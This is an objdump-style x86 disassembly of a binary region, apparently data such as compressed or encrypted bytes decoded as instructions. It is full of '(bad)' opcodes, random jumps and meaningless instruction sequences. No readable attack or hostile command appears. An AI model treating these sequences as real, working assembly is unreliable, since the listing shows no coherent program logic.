  418747:	add    ch,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    cl,dh
  41874d:	mov    esi,0xd815f624
  418752:	xchg   ecx,eax
  418753:	test   eax,0x9a0f811f
  418758:	(bad)  
  418759:	ins    BYTE PTR es:[edi],dx
  41875a:	push   edi
  41875b:	jae    0x418770
  41875d:	dec    ebp
  41875e:	mov    WORD PTR [esi+0x4a],?
  418761:	gs jno 0x418765
  418764:	jb     0x4187b5
  418766:	clc    
  418767:	cwde   
  418768:	xchg   ecx,eax
  418769:	dec    esp
  41876a:	jecxz  0x41877a
  41876c:	xchg   ebx,eax
  41876d:	pop    ebp
  41876e:	jno    0x41875d
  418770:	pusha  
  418771:	and    BYTE PTR [ebx],al
  418773:	sub    eax,DWORD PTR [edx-0x39094fd]
  418779:	push   0x1eb98c0f
  41877e:	mov    DWORD PTR [ebx+ebx*8-0x11267587],ebp
  418785:	es scas al,BYTE PTR es:[edi]
  418787:	push   ebx
  418788:	jns    0x4187de
  41878a:	jnp    0x418720
  41878c:	dec    esp
  41878d:	push   edi
  41878e:	xchg   DWORD PTR [ebp-0xfd93cfe],edx
  418794:	xchg   ebp,eax
  418795:	jmp    0x363b:0x54673636
  41879c:	clc    
  41879d:	sub    ch,bh
  41879f:	(bad)  
  4187a0:	mov    eax,esi
  4187a2:	pop    esp
  4187a3:	sti    
  4187a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a5:	mov    ecx,0xa8bd827e
  4187aa:	or     esp,esi
  4187ac:	bound  esi,QWORD PTR [ebx+0x7516b1a6]
  4187b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187b3:	stos   DWORD PTR es:[edi],eax
  4187b4:	div    eax
  4187b6:	xor    al,0xa9
  4187b8:	adc    esp,edx
  4187ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187bb:	add    ah,ah
  4187bd:	jecxz  0x418755
  4187bf:	mov    ds:0xffc1e9f4,eax
  4187c4:	int3   
  4187c5:	add    ch,BYTE PTR [ebp+0x1596dcb4]
  4187cb:	daa    
  4187cc:	repz mov esi,0x9dc908a5
  4187d2:	cmp    edi,DWORD PTR [eax]
  4187d4:	test   eax,0xde14a02b
  4187d9:	test   BYTE PTR [edx+0x31],ah
  4187dc:	ins    BYTE PTR es:[edi],dx
  4187dd:	ds cwde 
  4187df:	test   DWORD PTR [edi-0x72992f88],0xe6873f14
  4187e9:	inc    esp
  4187ea:	fdivr  st,st(5)
  4187ec:	jbe    0x41886c
  4187ee:	lods   al,BYTE PTR ds:[esi]
  4187ef:	sub    eax,0x29887508
  4187f4:	sbb    al,0xd2
  4187f6:	jmp    0x41878b
  4187f8:	nop
  4187f9:	idiv   BYTE PTR [ecx+0x4a5aaf38]
  4187ff:	icebp  
  418800:	pop    ds
  418801:	cmp    DWORD PTR [edi-0xc],eax
  418804:	push   ds
  418805:	add    BYTE PTR [eax],ch
  418807:	lods   eax,DWORD PTR ds:[esi]
  418808:	jbe    0x41887c
  41880a:	lock sar al,1
  41880d:	inc    esi
  41880e:	pop    esi
  41880f:	daa    
  418810:	dec    ebx
  418811:	jg     0x4187ac
  418813:	push   ss
  418814:	pusha  
  418815:	rcl    esi,cl
  418817:	xor    al,al
  418819:	push   ebx
  41881a:	(bad)  
  41881b:	repz fadd DWORD PTR [edx+0x6f]
  41881f:	sub    DWORD PTR [ebp-0x582b7758],0xffffffbc
  418826:	in     eax,0xab
  418828:	or     bh,BYTE PTR [ebx-0x3e]
  41882b:	test   eax,0xc507af31
  418830:	inc    esp
  418831:	xchg   BYTE PTR [ecx],ah
  418833:	jl     0x4187ff
  418835:	push   cs
  418836:	test   al,0xe5
  418838:	lea    eax,[esi-0x52]
  41883b:	ret    0xce
  41883e:	std    
  41883f:	into   
  418840:	inc    esp
	...
  4188b1:	add    BYTE PTR [eax],al
  4188b3:	add    BYTE PTR [eax+0x41],bl
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0x3f5bad32,al
  4188c3:	rcr    bh,cl
  4188c5:	or     al,BYTE PTR [ecx]
  4188c7:	add    ch,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [ebp-0x4a0a1758],al
  4188d1:	mov    ecx,0x4d92555a
  4188d6:	lock aad 0x26
  4188d9:	icebp  
  4188da:	mov    WORD PTR [esi+0x34ece94e],cs
  4188e0:	xor    DWORD PTR [ebp-0x2a],0xffffffaa
  4188e4:	mov    al,ds:0x6fdca4b4
  4188e9:	sub    ax,0xf370
  4188ed:	retf   
  4188ee:	xor    al,BYTE PTR [ebx-0x31]
  4188f1:	js     0x418954
  4188f3:	addr16 or al,0x42
  4188f6:	jp     0x4188fa
  4188f8:	into   
  4188f9:	por    mm6,QWORD PTR [esi+0x0]
  4188fd:	frstor [edx+0x7cd2a0b9]
  418903:	pop    esp
  418904:	pop    edx
  418905:	retf   0xe92c
  418908:	push   edi
  418909:	into   
  41890a:	dec    esi
  41890b:	mov    bh,0xf9
  41890d:	sar    BYTE PTR [ebp-0x1d9fb05b],1
  418913:	(bad)  
  418914:	nop
  418915:	dec    ecx
  418916:	call   0x2c2cb8d8
  41891b:	mov    eax,ds:0x3d415cf1
  418920:	xchg   edx,eax
  418921:	jne    0x4188e6
  418923:	mov    edx,0xb50ba379
  418928:	bound  eax,QWORD PTR [ebp-0x15]
  41892b:	pop    eax
  41892c:	push   0x19250a8a
  418931:	dec    edi
  418932:	or     al,0xa9
  418934:	scas   eax,DWORD PTR es:[edi]
  418935:	retf   0xb0f5
  418938:	fst    DWORD PTR [edx]
  41893a:	iret   
  41893b:	adc    eax,0x7727e60c
  418940:	xlat   BYTE PTR ds:[ebx]
  418941:	mov    edx,0xec83ddeb
  418946:	cmp    esi,DWORD PTR [ecx]
  418948:	xor    bl,dl
  41894a:	mov    ds:0xe703fb52,al
  41894f:	mov    BYTE PTR ds:[eax+0x3256a57a],bh
  418956:	pop    ss
  418957:	xor    BYTE PTR [ebx-0x31],0xce
  41895b:	jae    0x4188f4
  41895d:	inc    ebp
  41895e:	ja     0x4189bf
  418960:	rol    edi,cl
  418962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418963:	aad    0xf7
  418965:	psubw  mm2,QWORD PTR [edx+0x58]
  418969:	mov    dl,0xbc
  41896b:	fwait
  41896c:	aas    
  41896d:	fild   DWORD PTR [ebx+0x39c6f1b3]
  418973:	cli    
  418974:	shl    DWORD PTR [ecx-0x4e016e3c],1
  41897a:	add    edx,DWORD PTR [esp+edi*4-0x516dcf1c]
  418981:	fidiv  WORD PTR [ebp+0x48]
  418984:	stos   BYTE PTR es:[edi],al
  418985:	imul   edx,DWORD PTR [ebx+0x2b],0xeb30407b
  41898c:	out    0x61,eax
  41898e:	fwait
  41898f:	and    dh,BYTE PTR ds:0x9a31439a
  418995:	(bad)  
  418996:	loopne 0x41897f
  418998:	mov    cl,0xd1
  41899a:	repnz cmp BYTE PTR [edi+0x53],ch
  41899e:	frstor [eax]
  4189a0:	jmp    0x66ea033
  4189a5:	bound  edi,QWORD PTR [esi-0xe]
  4189a8:	dec    esp
  4189a9:	data16 or BYTE PTR [edx-0x5d5e929b],ah
  4189b0:	cmp    BYTE PTR [edx-0x7a],bh
  4189b3:	push   0xe9235a21
  4189b8:	outs   dx,DWORD PTR ds:[esi]
  4189b9:	mov    ch,0xaf
  4189bb:	mov    ah,0xfb
  4189bd:	cdq    
  4189be:	inc    eax
  4189bf:	xchg   DWORD PTR [eax+eax*1+0x0],eax
	...
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	inc    eax
  418a41:	xor    al,0x4
  418a43:	mov    cl,0xd4
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    ch,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [eax+edi*2-0xb],ch
  418a4f:	cmp    DWORD PTR [esi-0x72235a45],edx
  418a55:	push   0x32
  418a57:	ja     0x418a74
  418a59:	test   eax,0xe9c819df
  418a5e:	out    dx,al
  418a5f:	push   ds
  418a60:	xchg   ebp,eax
  418a61:	mov    WORD PTR [edx+0x74],?
  418a64:	out    dx,al
  418a65:	sahf   
  418a66:	ins    BYTE PTR es:[edi],dx
  418a67:	shr    cl,1
  418a69:	mov    ds:0xcdf406d2,eax
  418a6e:	mov    ah,0xa4
  418a70:	cld    
  418a71:	sub    eax,0x111a550c
  418a76:	mov    cl,0x36
  418a78:	sti    
  418a79:	leave  
  418a7a:	loope  0x418ab0
  418a7c:	rcr    BYTE PTR [edx],0x71
  418a7f:	int    0x21
  418a81:	mov    bh,bl
  418a83:	shr    BYTE PTR [ebp-0x20d7481b],cl
  418a89:	das    
  418a8a:	into   
  418a8b:	stos   DWORD PTR es:[edi],eax
  418a8c:	bound  ebx,QWORD PTR [ebx]
  418a8e:	xlat   BYTE PTR ds:[ebx]
  418a8f:	mov    al,ds:0x3b9acb9e
  418a94:	(bad)  
  418a95:	ja     0x418a1d
  418a97:	ja     0x418a33
  418a99:	loope  0x418ad1
  418a9b:	in     al,dx
  418a9c:	sub    ah,BYTE PTR [edx]
  418a9e:	or     al,0xf9
  418aa0:	cs loopne 0x418a62
  418aa3:	dec    edi
  418aa4:	dec    ecx
  418aa5:	jg     0x418a5a
  418aa7:	mov    al,0xc5
  418aa9:	mov    ds:0x61ea7cef,al
  418aae:	icebp  
  418aaf:	repnz sub BYTE PTR [edi],ch
  418ab2:	push   ss
  418ab3:	lods   al,BYTE PTR ds:[esi]
  418ab4:	cmp    DWORD PTR [ecx-0x12763b2e],edi
  418aba:	push   ecx
  418abb:	(bad)  
  418abd:	gs xchg esp,eax
  418abf:	or     eax,0xbd2ae18b
  418ac4:	adc    esp,0xffffff98
  418ac7:	jge    0x418b3a
  418ac9:	out    0x46,eax
  418acb:	xchg   edi,eax
  418acc:	stos   BYTE PTR es:[edi],al
  418acd:	pusha  
  418ace:	aad    0x8d
  418ad0:	test   al,0x36
  418ad2:	pusha  
  418ad3:	fisttp QWORD PTR [eax]
  418ad5:	cmc    
  418ad6:	sub    ebx,edx
  418ad8:	outs   dx,BYTE PTR ds:[esi]
  418ad9:	sbb    al,BYTE PTR [ecx-0x6f17f525]
  418adf:	mov    ecx,0xeda6e7a6
  418ae4:	call   0x91191c91
  418ae9:	push   es
  418aea:	add    bh,BYTE PTR [esi]
  418aec:	pushf  
  418aed:	xor    ah,BYTE PTR [edi]
  418aef:	iret   
  418af0:	inc    eax
  418af1:	not    BYTE PTR [edx]
  418af3:	rcr    dl,1
  418af5:	out    0x1f,eax
  418af7:	pop    edx
  418af8:	jg     0x418ab4
  418afa:	sub    edx,DWORD PTR [ebp-0x6c1e0f27]
  418b00:	sub    al,0x1b
  418b02:	pushf  
  418b03:	out    dx,eax
  418b04:	push   cs
  418b05:	push   eax
  418b06:	cmp    BYTE PTR [ecx-0x6f5c3eb0],0xcd
  418b0d:	cmp    eax,DWORD PTR [esi+0x465fba88]
  418b13:	outs   dx,DWORD PTR ds:[esi]
  418b14:	push   0x9ca48a88
  418b19:	jmp    0x418b1c
  418b1b:	in     eax,dx
  418b1c:	push   ecx
  418b1d:	pop    edi
  418b1e:	push   edx
  418b1f:	dec    ebx
  418b20:	jp     0x418ab4
  418b22:	lds    edi,FWORD PTR [edi+0x5a3c1176]
  418b28:	xor    esp,DWORD PTR [eax-0x18fac9a0]
  418b2e:	jmp    FWORD PTR [edx-0x230943d6]
  418b34:	cs push 0xad1e625c
  418b3a:	jl     0x418af1
  418b3c:	imul   edi,ebp,0xffffff90
  418b3f:	xchg   ebp,eax
  418b40:	pop    ebp
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	cs add al,cl
  418bc3:	ret    0xcc9
  418bc6:	add    DWORD PTR [eax],eax
  418bc8:	cmc    
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [ebp-0x75e9e54d],al
  418bd1:	cmp    BYTE PTR [edi-0x33],bh
  418bd4:	std    
  418bd5:	enter  0xd5db,0x89
  418bd9:	jno    0x418c13
  418bdb:	call   0x8e165a87
  418be0:	adc    dh,cl
  418be2:	cmp    BYTE PTR [ecx+0x57],ch
  418be5:	es loopne 0x418bef
  418be8:	sbb    eax,0x36fd33ef
  418bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bef:	xchg   edi,eax
  418bf0:	ret    0x9541
  418bf3:	inc    ebp
  418bf4:	xchg   ecx,eax
  418bf5:	inc    esi
  418bf6:	inc    eax
  418bf7:	fcmovnb st,st(0)
  418bf9:	sbb    eax,0xd1ed9ff2
  418bfe:	mov    ebx,0xdef27fba
  418c03:	or     DWORD PTR [ebx-0x46e60aed],ecx
  418c09:	test   DWORD PTR [ebx+ebp*8],ebp
  418c0c:	jae    0x418b8f
  418c0e:	clc    
  418c0f:	jl     0x418c0f
  418c11:	retf   
  418c12:	loop   0x418c04
  418c14:	xchg   esp,eax
  418c15:	pop    ebx
  418c16:	adc    DWORD PTR [esi+0x56],ebp
  418c19:	cwde   
  418c1a:	dec    edi
  418c1b:	aaa    
  418c1c:	dec    ebp
  418c1d:	mov    ecx,0x20efb0a1
  418c22:	ins    DWORD PTR es:[edi],dx
  418c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c24:	mov    esp,0xa75acb3a
  418c29:	cmp    DWORD PTR [esi-0x3e],esi
  418c2c:	dec    ebp
  418c2d:	invd   
  418c2f:	ja     0x418c6b
  418c31:	in     al,0x32
  418c33:	fcom   st(7)
  418c35:	and    ebp,DWORD PTR [edi+0x653a84d3]
  418c3b:	push   edi
  418c3c:	std    
  418c3d:	add    DWORD PTR [edi+0x7b23d1bd],ecx
  418c43:	xor    ebp,DWORD PTR [ecx]
  418c45:	push   ss
  418c46:	adc    ch,al
  418c48:	scas   al,BYTE PTR es:[edi]
  418c49:	add    dl,al
  418c4b:	out    0xe8,eax
  418c4d:	addr16 dec ebx
  418c4f:	popf   
  418c50:	out    0x15,eax
  418c52:	nop
  418c53:	and    DWORD PTR [ebx],edi
  418c55:	mov    al,ds:0xb9d6cbee
  418c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c5b:	mov    ds:0x77436073,eax
  418c60:	or     cl,BYTE PTR [eax+edx*1]
  418c63:	and    eax,0x53341107
  418c68:	fisub  DWORD PTR gs:[ebp+edx*4-0x626792f9]
  418c70:	ins    DWORD PTR es:[edi],dx
  418c71:	dec    esi
  418c72:	pop    ebx
  418c73:	mov    ecx,0x53d33528
  418c78:	push   es
  418c79:	lods   eax,DWORD PTR ds:[esi]
  418c7a:	jne    0x418cf4
  418c7c:	inc    edx
  418c7d:	adc    eax,DWORD PTR [ecx]
  418c7f:	out    0xca,al
  418c81:	outs   dx,DWORD PTR ds:[esi]
  418c82:	xchg   edi,eax
  418c83:	mov    ah,0x60
  418c85:	leave  
  418c86:	pusha  
  418c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c88:	mov    ds:0xb9b932e2,al
  418c8d:	loop   0x418d08
  418c8f:	inc    esp
  418c90:	gs mov ebx,0x27f9a9c8
  418c96:	and    al,0x30
  418c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c99:	sti    
  418c9a:	loop   0x418d09
  418c9c:	jae    0x418d19
  418c9e:	xchg   esi,eax
  418c9f:	sbb    al,BYTE PTR [edx+0x3f]
  418ca2:	outs   dx,BYTE PTR ds:[esi]
  418ca3:	fld    DWORD PTR [ebp-0x558aa72d]
  418ca9:	test   BYTE PTR [ebp-0x7a],al
  418cac:	push   ds
  418cad:	mov    esi,0xdd15fa2e
  418cb2:	mov    esp,0xbc6a9a7c
  418cb7:	sub    edx,DWORD PTR [ebx+0x5b5ba156]
  418cbd:	xor    eax,0x966275
	...
  418d32:	add    BYTE PTR [eax],al
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x55637d61
  418d43:	pop    es
  418d44:	mov    esi,0xf500010d
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    BYTE PTR [edi],dh
  418d4d:	mov    eax,ds:0x520fe42c
  418d52:	jmp    0x8fb540b7
  418d57:	dec    edx
  418d58:	cld    
  418d59:	test   al,0x1c
  418d5b:	leave  
  418d5c:	ja     0x418d38
  418d5e:	test   DWORD PTR [ecx-0x28],edx
  418d61:	(bad)  
  418d62:	and    al,0x21
  418d64:	mov    al,0x7f
  418d66:	and    DWORD PTR [edi],esi
  418d68:	imul   esp,DWORD PTR [ebx+0x7add3971],0xffffffd4
  418d6f:	mov    bl,0x88
  418d71:	mov    ds:0x88f8b7aa,al
  418d76:	rcr    bl,0xbb
  418d79:	div    DWORD PTR [ecx]
  418d7b:	loop   0x418dc0
  418d7d:	test   eax,0x6dd0b57
  418d82:	(bad)  
  418d83:	nop
  418d84:	iret   
  418d85:	mov    eax,ds:0xd12c5a31
  418d8a:	push   ebx
  418d8b:	sbb    BYTE PTR [ecx-0x25fb65b6],cl
  418d91:	mov    esi,DWORD PTR [ecx]
  418d93:	ret    0x1b15
  418d96:	cmp    ah,BYTE PTR [eax+edx*4-0x386d7b2a]
  418d9d:	jecxz  0x418d52
  418d9f:	pop    esp
  418da0:	push   esp
  418da1:	add    BYTE PTR [esi],0xe3
  418da4:	xchg   ebx,eax
  418da5:	lods   al,BYTE PTR ds:[esi]
  418da6:	or     eax,0x649a2bc8
  418dab:	mov    edx,0xaac9d16b
  418db0:	int    0xfd
  418db2:	mov    bl,0x31
  418db4:	fdiv   st,st(3)
  418db6:	add    bl,BYTE PTR ds:0x945f5deb
  418dbc:	fcomp  DWORD PTR ds:0x591a3a19
  418dc2:	sbb    BYTE PTR [esi],0x6d
  418dc5:	jl     0x418e34
  418dc7:	cmp    BYTE PTR [edx+0x61],0x66
  418dcb:	inc    edi
  418dcc:	shl    BYTE PTR [ecx],0xd6
  418dcf:	pushf  
  418dd0:	sub    al,0xec
  418dd2:	int    0xad
  418dd4:	sub    ebx,DWORD PTR [ecx]
  418dd6:	daa    
  418dd7:	and    al,0x9f
  418dd9:	outs   dx,DWORD PTR ds:[esi]
  418dda:	repz mov eax,ds:0x1fe46a28
  418de0:	add    DWORD PTR [edx-0x1f],esp
  418de3:	mov    DWORD PTR [ecx],esp
  418de5:	jmp    0x418e0e
  418de7:	adc    dh,cl
  418de9:	push   esi
  418dea:	in     al,dx
  418deb:	cmp    BYTE PTR [ebx],cl
  418ded:	jle    0x418e36
  418def:	out    0xad,al
  418df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418df2:	mov    cl,0x3a
  418df4:	xchg   DWORD PTR [edx+ecx*2+0x64271d32],edi
  418dfb:	jnp    0x418e34
  418dfd:	clc    
  418dfe:	mov    bh,0x55
  418e00:	and    BYTE PTR [edx+0x19c5e001],dh
  418e06:	ret    0xcbf8
  418e09:	scas   al,BYTE PTR es:[edi]
  418e0a:	ja     0x418e31
  418e0c:	cwde   
  418e0d:	scas   al,BYTE PTR es:[edi]
  418e0e:	out    0xf3,eax
  418e10:	sar    BYTE PTR [edx+0x455746e7],0xb9
  418e17:	sub    edx,DWORD PTR [ebp+0x6]
  418e1a:	mov    eax,ds:0x8f91bcd5
  418e1f:	dec    esi
  418e20:	mov    eax,0x35e80c42
  418e25:	mov    ebx,0x95974b0f
  418e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e2b:	pusha  
  418e2c:	sahf   
  418e2d:	jmp    0x418e9b
  418e2f:	mov    ecx,0x2288fe77
  418e34:	mov    ch,0x75
  418e36:	(bad)
  418e3a:	mov    BYTE PTR [esi+0x34d55f97],al
  418e40:	sub    DWORD PTR [eax],eax
	...
  418eb2:	add    BYTE PTR [eax],al
  418eb4:	(bad)  
  418eb5:	out    0xe6,al
  418eb7:	cmp    esp,esi
  418eb9:	cmp    edi,edi
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	add    edi,esi
  418ec2:	pop    ebx
  418ec3:	sbb    esi,DWORD PTR [ebx-0xafffef2]
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    cl,ch
  418ecd:	and    eax,0x99012bc0
  418ed2:	std    
  418ed3:	outs   dx,DWORD PTR ds:[esi]
  418ed4:	popa   
  418ed5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ed6:	repnz lds eax,FWORD PTR [edx-0x4e]
  418eda:	std    
  418edb:	outs   dx,BYTE PTR ds:[esi]
  418edc:	xchg   esi,eax
  418edd:	ja     0x418f1d
  418edf:	fdivrp st(2),st
  418ee1:	mov    DWORD PTR [edi-0x41],edi
  418ee4:	(bad)  
  418ee6:	imul   ebx,DWORD PTR [ecx-0x17],0xffffffae
  418eea:	xlat   BYTE PTR ss:[ebx]
  418eec:	inc    esi
  418eed:	loop   0x418f55
  418eef:	in     eax,dx
  418ef0:	push   ebp
  418ef1:	ins    BYTE PTR es:[edi],dx
  418ef2:	sbb    al,BYTE PTR [edi]
  418ef4:	cmp    eax,0xba6d6e7f
  418ef9:	and    al,0x5
  418efb:	sbb    dl,BYTE PTR [ecx]
  418efd:	shr    eax,cl
  418eff:	(bad)  
  418f00:	popa   
  418f01:	(bad)  
  418f02:	jle    0x418f2d
  418f04:	leave  
  418f05:	scas   al,BYTE PTR es:[edi]
  418f06:	or     eax,0x6a345e15
  418f0b:	push   edi
  418f0c:	shl    BYTE PTR [eax],1
  418f0e:	or     al,BYTE PTR [esi+esi*4-0x7f]
  418f12:	add    al,0x4a
  418f14:	in     al,dx
  418f15:	jo     0x418f7b
  418f17:	mov    dh,0xbf
  418f19:	pusha  
  418f1a:	xchg   esi,eax
  418f1b:	cmp    al,BYTE PTR [eax+0x75edbe5a]
  418f21:	or     al,0x57
  418f23:	imul   ecx,DWORD PTR [edx-0x23],0xffffff86
  418f27:	nop
  418f28:	out    dx,al
  418f29:	and    ah,dl
  418f2b:	ror    DWORD PTR [ebp-0x4a],1
  418f2e:	leave  
  418f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f30:	cs push 0xfffffff8
  418f33:	lahf   
  418f34:	test   eax,0xb9dfd624
  418f39:	call   0xe6ce:0xd1528b37
  418f40:	and    bl,BYTE PTR [ebp-0x80]
  418f43:	push   ebp
  418f44:	(bad)  
  418f46:	xchg   esp,eax
  418f47:	fsubr  DWORD PTR [edi-0x49144176]
  418f4d:	mov    ds:0xf75e6b21,eax
  418f52:	rcr    BYTE PTR [edi],cl
  418f54:	retf   
  418f55:	(bad)  
  418f56:	sbb    DWORD PTR [ebx-0x47],eax
  418f59:	repnz test BYTE PTR [eax+0x66659354],ch
  418f60:	ins    BYTE PTR es:[edi],dx
  418f61:	fcom   QWORD PTR [ecx-0x29]
  418f64:	cwde   
  418f65:	popf   
  418f66:	pop    ds
  418f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f68:	lods   eax,DWORD PTR ds:[esi]
  418f69:	icebp  
  418f6a:	and    ah,BYTE PTR ds:0xdd267d48
  418f70:	(bad)  
  418f71:	int3   
  418f72:	or     esi,esi
  418f74:	in     al,dx
  418f75:	mov    edi,0xcf4024a9
  418f7a:	and    BYTE PTR [ecx+ecx*2+0x45d2a6e7],dl
  418f81:	(bad)  
  418f82:	(bad)  
  418f83:	dec    ebx
  418f84:	cmp    al,0xe8
  418f86:	mov    eax,ds:0xf8529157
  418f8b:	ja     0x418fd3
  418f8d:	pop    edx
  418f8e:	mov    dh,0xbe
  418f90:	xchg   esi,eax
  418f91:	sti    
  418f92:	inc    edx
  418f93:	leave  
  418f94:	js     0x418ff2
  418f96:	jg     0x418f1e
  418f98:	inc    edi
  418f99:	ret    0x5507
  418f9c:	push   esi
  418f9d:	xlat   BYTE PTR ds:[ebx]
  418f9e:	cdq    
  418f9f:	inc    edx
  418fa0:	and    eax,0x2f33d453
  418fa5:	sbb    al,0x1e
  418fa7:	fwait
  418fa8:	out    0xb1,al
  418faa:	cmp    esi,DWORD PTR [edi+0x7e]
  418fad:	xor    DWORD PTR [ecx-0x1f],edi
  418fb0:	fucomp st(7)
  418fb2:	adc    al,0x79
  418fb4:	(bad)  
  418fb5:	rcr    DWORD PTR [ebx-0x5960a5a0],0x28
  418fbc:	and    BYTE PTR [edi],bh
  418fbe:	push   edi
  418fbf:	aad    0x70
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shl    dh,cl
  419041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419042:	mov    ecx,0x10fa81c
  419047:	add    ch,dh
  419049:	add    BYTE PTR [eax],al
  41904b:	add    bh,ch
  41904d:	into   
  41904e:	(bad)
  419051:	outs   dx,BYTE PTR ds:[esi]
  419052:	pop    esi
  419053:	aas    
  419054:	popf   
  419055:	inc    eax
  419056:	lea    edx,[ebp-0x4ef09e32]
  41905c:	mov    WORD PTR ds:0x60c4c9c5,ss
  419062:	mov    cl,0xa7
  419064:	mov    WORD PTR [esi+0x9],ss
  419067:	in     al,0x48
  419069:	loope  0x4190de
  41906b:	leave  
  41906c:	and    BYTE PTR [esi],bl
  41906e:	xor    BYTE PTR [ecx],al
  419070:	push   ebp
  419071:	fidivr DWORD PTR [eax+0x21]
  419074:	xchg   ebx,eax
  419075:	mov    ch,0x8b
  419077:	xor    al,0x66
  419079:	adc    BYTE PTR [ebx+0x1e60733],0x4f
  419080:	mov    bh,0xa6
  419082:	adc    edi,DWORD PTR [esi]
  419084:	or     dl,ch
  419086:	jmp    0x4190ed
  419088:	fs mov ebp,ss
  41908b:	pop    esp
  41908c:	inc    esp
  41908d:	jmp    0x5dde:0x4cb9007f
  419094:	or     ebp,eax
  419096:	shl    BYTE PTR [edi],0x4b
  419099:	xchg   esp,eax
  41909a:	add    ecx,eax
  41909c:	ins    DWORD PTR es:[edi],dx
  41909d:	push   edx
  41909e:	push   esi
  41909f:	arpl   WORD PTR [esi+0x1dd409c6],cx
  4190a5:	pop    ecx
  4190a6:	pop    es
  4190a7:	xor    esi,DWORD PTR [edi+0x46]
  4190aa:	or     di,WORD PTR [esi-0x5ab05019]
  4190b1:	outs   dx,DWORD PTR ds:[esi]
  4190b2:	mov    esi,0xdea62368
  4190b7:	(bad)  
  4190b8:	adc    BYTE PTR [edx-0x2b],bl
  4190bb:	mov    bh,0x84
  4190bd:	and    al,bl
  4190bf:	push   eax
  4190c0:	fwait
  4190c1:	sbb    eax,0x6f581797
  4190c6:	stos   BYTE PTR es:[edi],al
  4190c7:	xchg   ecx,eax
  4190c8:	sbb    BYTE PTR [edx-0x2ca1cad2],al
  4190ce:	push   ecx
  4190cf:	dec    esi
  4190d0:	lods   eax,DWORD PTR ds:[esi]
  4190d1:	int    0xf1
  4190d3:	loope  0x4190a4
  4190d5:	mov    ds,WORD PTR ds:0xbcb9891b
  4190db:	es fcmovb st,st(6)
  4190de:	add    BYTE PTR [edi-0x79960f77],dh
  4190e4:	lods   al,BYTE PTR ds:[esi]
  4190e5:	push   esp
  4190e6:	outs   dx,DWORD PTR ds:[esi]
  4190e7:	fcom   DWORD PTR [esi]
  4190e9:	popf   
  4190ea:	sbb    ecx,esp
  4190ec:	mov    BYTE PTR [esi+0x720a56f2],0x25
  4190f3:	pop    esi
  4190f4:	dec    edi
  4190f5:	mov    ah,0x9a
  4190f7:	push   ss
  4190f8:	jnp    0x419116
  4190fa:	repnz push ecx
  4190fc:	sbb    eax,0x924d42ab
  419101:	sbb    eax,0xd7215762
  419106:	(bad)  
  419107:	sub    BYTE PTR [ebp+edx*4+0x2676cb88],ch
  41910e:	mov    WORD PTR [edx+0x71],fs
  419111:	in     eax,dx
  419112:	mov    cs,WORD PTR [eax-0x38b22e2c]
  419118:	(bad)  
  419119:	adc    ebx,ecx
  41911b:	scas   al,BYTE PTR es:[edi]
  41911c:	loope  0x419107
  41911e:	dec    ecx
  41911f:	or     eax,DWORD PTR [eax+0x590b81f1]
  419125:	imul   esi,DWORD PTR [ebp+0x41a0b576],0x11
  41912c:	xchg   ebx,eax
  41912d:	loop   0x419107
  41912f:	(bad)  
  419130:	push   ecx
  419131:	sbb    al,0xb
  419133:	fldenv [ebp-0x21]
  419136:	rcr    BYTE PTR [esp+eiz*8],cl
  419139:	bound  esp,QWORD PTR [ebx]
  41913b:	or     BYTE PTR [ecx-0x77],ch
  41913e:	mov    dl,0xd3
  419140:	out    0x0,eax
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
